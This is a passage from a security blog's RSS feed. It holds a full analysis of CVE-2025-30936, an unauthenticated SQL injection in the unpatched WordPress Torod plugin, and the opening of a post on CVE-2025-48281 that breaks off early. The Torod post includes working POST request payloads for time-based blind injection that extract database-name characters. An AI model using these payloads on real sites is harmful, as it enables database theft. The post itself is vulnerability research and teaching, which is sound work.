      <title>CVE-2025-30936 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-28-cve-2025-30936/</link>
      <pubDate>Sun, 28 Sep 2025 20:51:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-28-cve-2025-30936/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Torod&lt;/strong&gt; plugin for WordPress. This could allow attackers to directly interact with your database, including but not limited to stealing information.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30936&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30936&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/torod/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fixed in&lt;/strong&gt;: &amp;lt;= N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Torod&lt;/strong&gt;: v1.9&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The core cause is that the application directly inserts data from a &lt;strong&gt;POST&lt;/strong&gt; request into an SQL query without proper input validation or control mechanisms.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-sink&#34;&gt;&lt;span&gt;Vulnerable Sink&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-sink&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;This CVE has no patch available, so we cannot use a &lt;strong&gt;diff tool&lt;/strong&gt; to compare the vulnerable and fixed versions.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;In WordPress, for SQLi to occur, the application must interact with the database through the global variable &lt;code&gt;$wpdb&lt;/code&gt;. We can search for this keyword in the plugin directory to locate the sink.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_sink.png&#34; title=&#34;Locate the sink in code&#34; data-thumbnail=&#34;/posts/2025-09-28-cve-2025-30936/search_sink.png&#34; data-sub-html=&#34;&lt;h2&gt;Search sink&lt;/h2&gt;&lt;p&gt;Locate the sink in code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_sink.png&#39; alt=&#34;Search sink&#34; height=&#34;609&#34; width=&#34;1477&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Locate the sink in code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 The data from &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt; is directly inserted into the SQL query without proper validation. Using &lt;code&gt;sanitize_text_field()&lt;/code&gt; only escapes the string, not fully sanitizing it. Therefore, the SQL Injection vulnerability can occur.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Source: &lt;code&gt;$_POST[&#39;country_id&#39;]&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sink: &lt;code&gt;$wpdb-&amp;gt;get_results(&amp;quot;SELECT * FROM $table_name WHERE country_id = $country_id&amp;quot;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerability lies in the &lt;code&gt;get_regions_and_cities&lt;/code&gt; function of the &lt;code&gt;ajaxyk&lt;/code&gt; class within the &lt;strong&gt;inc/ajaxyk.php&lt;/strong&gt; file. To determine where it’s called, we search for the keyword &lt;code&gt;get_regions_and_cities&lt;/code&gt; within the plugin directory.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_1.png&#34; title=&#34;Find the get_regions_and_cities function&#34; data-thumbnail=&#34;/posts/2025-09-28-cve-2025-30936/search_1.png&#34; data-sub-html=&#34;&lt;h2&gt;Search 1&lt;/h2&gt;&lt;p&gt;Find the get_regions_and_cities function&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-28-cve-2025-30936/search_1.png&#39; alt=&#34;Search 1&#34; height=&#34;321&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Find the get_regions_and_cities function&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 &lt;code&gt;get_regions_and_cities&lt;/code&gt; is registered as a callback for two action hooks via the &lt;code&gt;add_action&lt;/code&gt; function in the &lt;code&gt;ajaxyk&lt;/code&gt; constructor.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Written in the format &lt;code&gt;wp_ajax_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Requires user authentication&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Written in the format &lt;code&gt;wp_ajax_nopriv_{$action}&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Does not require authentication&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Since this is an &lt;strong&gt;unauthenticated&lt;/strong&gt; vulnerability, we only focus on the &lt;code&gt;wp_ajax_nopriv_get_regions_and_cities&lt;/code&gt; hook.&lt;/p&gt;&#xA;&lt;p&gt;Thus, when a &lt;strong&gt;POST&lt;/strong&gt; request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with parameters:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=wp_ajax_nopriv_get_regions_and_cities&amp;amp;country_id=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The &lt;code&gt;get_regions_and_cities&lt;/code&gt; callback is triggered.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;country_id&lt;/code&gt; is taken directly from the request and injected into the SQL query.&lt;/li&gt;&#xA;&lt;li&gt;The query executes with the malicious payload.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detecting-sqli&#34;&gt;&lt;span&gt;Detecting SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detecting-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;POST request&lt;/strong&gt; containing the SQLi payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities&amp;amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resulting query becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-28-cve-2025-30936/time_resp.png&#34; title=&#34;Response time result&#34; data-thumbnail=&#34;/posts/2025-09-28-cve-2025-30936/time_resp.png&#34; data-sub-html=&#34;&lt;h2&gt;Responsed time&lt;/h2&gt;&lt;p&gt;Response time result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-28-cve-2025-30936/time_resp.png&#39; alt=&#34;Responsed time&#34; height=&#34;251&#34; width=&#34;402&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response time result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on the response time =&amp;gt; the payload works.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Techniques usable when the table is empty:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;UNION&lt;/strong&gt;: Since it does not depend on existing data in the table, but requires knowing the number of columns.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery in WHERE clause&lt;/strong&gt;: MySQL may optimize and skip the subquery if the result can be determined early. If the table has no data, MySQL might not execute &lt;code&gt;SLEEP()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Subquery in FROM clause&lt;/strong&gt;: The subquery is treated as a temporary table. MySQL must execute it first to build the temp table before executing the main query.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34; title=&#34;SQL execution order&#34; data-thumbnail=&#34;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#34; data-sub-html=&#34;&lt;h2&gt;SQL Execution Order&lt;/h2&gt;&lt;p&gt;SQL execution order&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png&#39; alt=&#34;SQL Execution Order&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;SQL execution order&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-the-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get the First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-the-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The prerequisite to &lt;strong&gt;dump all data&lt;/strong&gt; is to retrieve at least one character of the database name. Once that is achieved, the rest can be enumerated.&lt;/p&gt;&#xA;&lt;p&gt;Send a request with the &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&#xA;&#xA;action=get_regions_and_cities=1&amp;amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, &lt;code&gt;SUBSTRING()&lt;/code&gt; extracts the first character of the &lt;strong&gt;database name&lt;/strong&gt;, and &lt;code&gt;IF()&lt;/code&gt; triggers &lt;code&gt;SLEEP(5)&lt;/code&gt; if that character is &lt;code&gt;0x77&lt;/code&gt; (&amp;lsquo;w&amp;rsquo;).&lt;/p&gt;&#xA;&lt;p&gt;We use the hex encoding &lt;code&gt;0x77&lt;/code&gt; for &lt;code&gt;w&lt;/code&gt; because &lt;code&gt;country_id&lt;/code&gt; is taken from a &lt;strong&gt;POST&lt;/strong&gt; request, which is escaped by &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; in WordPress and by &lt;code&gt;sanitize_text_field&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Based on response time =&amp;gt; the first character is confirmed to be &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-30936&lt;/strong&gt; vulnerability in the &lt;strong&gt;WordPress Torod&lt;/strong&gt; plugin (version ≤ 1.9) stems from directly inserting user input into an SQL query without proper validation, leading to a classic SQL Injection flaw.&lt;/p&gt;&#xA;&lt;p&gt;No official patch has been released for this vulnerability yet.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always validate and sanitize user input properly.&lt;/li&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when interacting with the database in WordPress to prevent SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Keep plugins up-to-date and perform regular security assessments to avoid being targeted.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Torod Plugin &amp;lt;= 1.9 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48281 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-27-cve-2025-48281/</link>
      <pubDate>Sat, 27 Sep 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-27-cve-2025-48281/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-27-cve-2025-48281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability exists in the &lt;strong&gt;MyStyle Custom Product Designer&lt;/strong&gt; WordPress plugin prior to version &lt;strong&gt;3.21.2&lt;/strong&gt;. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mystyle-custom-product-designer&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MyStyle Custom Product Designer Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.21.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;:  High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 